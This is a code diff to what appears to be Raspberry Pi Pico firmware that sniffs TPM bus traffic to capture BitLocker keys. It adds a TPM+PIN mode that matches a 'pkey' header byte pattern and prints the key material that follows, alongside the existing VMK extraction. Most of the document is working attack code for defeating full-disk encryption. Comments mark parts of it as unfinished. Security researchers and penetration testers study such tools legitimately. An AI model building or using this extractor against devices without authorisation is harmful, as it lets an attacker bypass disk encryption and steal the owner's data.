@@ -9,11 +9,19 @@
 #include <tusb.h>
 #include <stdio.h>
 
+// define for TPM + PIN , undef for TPM only
+#undef TPM_AND_PIN
+
 // volume master key length in bytes.
 #define VMK_LENGTH_BYTES 32
 
 // volume master key length as a hexadecimal string, not including NULL termination.
 #define VMK_LENGTH_HEX (VMK_LENGTH_BYTES * 2)
+
+// pkey length in bytes (https://github.com/en4rab/SPITkey/blob/991fc19e9d0a672027cdbed5b7eabda9cfc6be69/logic2-plugins/BitLocker-Key-Extractor/HighLevelAnalyzer.py#L191)
+// r'5000000005000000(\w{144})'
+#define PKEY_LENGTH_BYTES (144 / 2)
+#define PKEY_LENGTH_HEX (PKEY_LENGTH_BYTES *2)
 
 // values used to parse TPM data.
 #define TPM_READ_MASK 0x80
@@ -302,49 +310,98 @@ void core1_dump_vmk() {
         {0x00, 0x00},
     };
 
-
     char vmk_hex_string[VMK_LENGTH_HEX + 1];
     uint8_t vmk_buffer[VMK_LENGTH_BYTES];
+    #ifdef TPM_AND_PIN
+
+    // "pkey" when using TPM+PIN (https://github.com/en4rab/SPITkey/blob/991fc19e9d0a672027cdbed5b7eabda9cfc6be69/logic2-plugins/BitLocker-Key-Extractor/HighLevelAnalyzer.py#L191)
+    //  r'50 00 00 00 05 00 00 00(\w{144})' 
+    const uint8_t pkey_header[] = {0x50, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00};
+    char pkey_hex_string[PKEY_LENGTH_HEX + 1];
+    uint8_t pkey_buffer[PKEY_LENGTH_BYTES];
+
+    #endif
 
     while(true) {
-        size_t index = 0;
+        size_t vmk_index = 0;
+        bool found_vmk = false ;
+        #ifdef TPM_AND_PIN
+        size_t pkey_index = 0;
+        bool found_pkey = false ;
+        #endif
+        // search for the VMK or PKEY header 
         uint8_t data = multicore_fifo_pop_blocking();
-
-        // search for the VMK header.
-        while(index < sizeof(vmk_header) / 2) {
-            // check each byte against the expected sequence.
-            if(data <= vmk_header[index][0] && data >= vmk_header[index][1]) {
+        #ifdef TPM_AND_PIN
+        while(!found_pkey) {
+        #else
+        while (!found_vmk) {
+        #endif
+            #ifndef TPM_AND_PIN
+            // check each byte against the expected sequence for vmk
+            if(data <= vmk_header[vmk_index][0] && data >= vmk_header[vmk_index][1]) {
                 // the byte matched the expected value.
                 // check the next byte in the sequence.
-                index++;
-            }
-            else if(index) {
-                // a byte failed to match partway through the sequence.
-                // return to the start of the sequence and check it again.
-                index = 0;
+                vmk_index++;
+                if (vmk_index >= sizeof(vmk_header) / 2) {
+                    // all values match, we have found VMK header
+                    found_vmk = true ;
+                }
+            } else if (vmk_index) {
+                vmk_index = 0 ;
+                // we need to check current data at index 0, so continue without reading next data
+                // problem: how to check data against pkey also ?
+                // easier to change mode on boot via gpo ?
                 continue;
             }
+            #else
+            /* need to check also for pkey, keeping different indexes in mind */
+
+            // same thing for pkey
+            if (data == pkey_header[pkey_index]) {
+                pkey_index++ ;
+                if (pkey_index >= sizeof(pkey_header)) {
+                    found_pkey = true ;
+                }
+            } else if (pkey_index) {
+                pkey_index = 0 ;
+                continue;
+            }
+            #endif
 
             data = multicore_fifo_pop_blocking();
         }
+        #ifndef TPM_AND_PIN
+        if (found_vmk) {
+            // found the VMK header.
+            // the following bytes should be the VMK.
+            // data may be streaming in faster than we can print it.
+            // buffer the VMK before displaying it so we don't drop bytes.
+            vmk_buffer[0] = data;
+            for(size_t i = 1; i < sizeof(vmk_buffer); i++) {
+                vmk_buffer[i] = multicore_fifo_pop_blocking();
+            }
 
-        // found the VMK header.
-        // the following bytes should be the VMK.
-        // data may be streaming in faster than we can print it.
-        // buffer the VMK before displaying it so we don't drop bytes.
-        vmk_buffer[0] = data;
-        for(size_t i = 1; i < sizeof(vmk_buffer); i++) {
-            vmk_buffer[i] = multicore_fifo_pop_blocking();
+            // format the VMK string so that we can print the whole thing at once.
+            for(size_t i = 0; i < sizeof(vmk_buffer); i++) {
+                sprintf(&vmk_hex_string[i*2], "%02X", vmk_buffer[i]);
+            }
+
+            // print the VMK.
+            // printf is supposedly thread-safe when using "pico_multicore", which we are.
+            printf("VMK: %s\n", vmk_hex_string);
         }
-
-        // format the VMK string so that we can print the whole thing at once.
-        for(size_t i = 0; i < sizeof(vmk_buffer); i++) {
-            sprintf(&vmk_hex_string[i*2], "%02X", vmk_buffer[i]);
+        #else
+        if (found_pkey) {
+            pkey_buffer[0] = data ;
+            for (size_t i = 1 ; i < sizeof(pkey_buffer); i++) {
+                pkey_buffer[i] = multicore_fifo_pop_blocking();
+            }
+            for (size_t i=0 ; i< sizeof(pkey_buffer); i++) {
+                sprintf(&pkey_hex_string[i*2], "%02X", pkey_buffer[i]);
+            }
+            printf("PKEY: %s\n", pkey_hex_string);
         }
-
-        // print the VMK.
-        // printf is supposedly thread-safe when using "pico_multicore", which we are.
-        printf("VMK: %s\n", vmk_hex_string);
+        #endif
     }
 }
 
@@ -477,6 +534,11 @@ int main() {
         BUFFER_LENGTH_BYTES
     );
 
+    #ifdef TPM_AND_PIN
+    printf("Expecting TPM and PIN protection. Pkey will be output if found.\n");
+    #else
+    printf("Expecting TPM only protection. VMK will be output if found.\n");
+    #endif
     printf("Press any key to finalize the capture and reboot.\n");
 
     // start synchronously capturing SPI data.
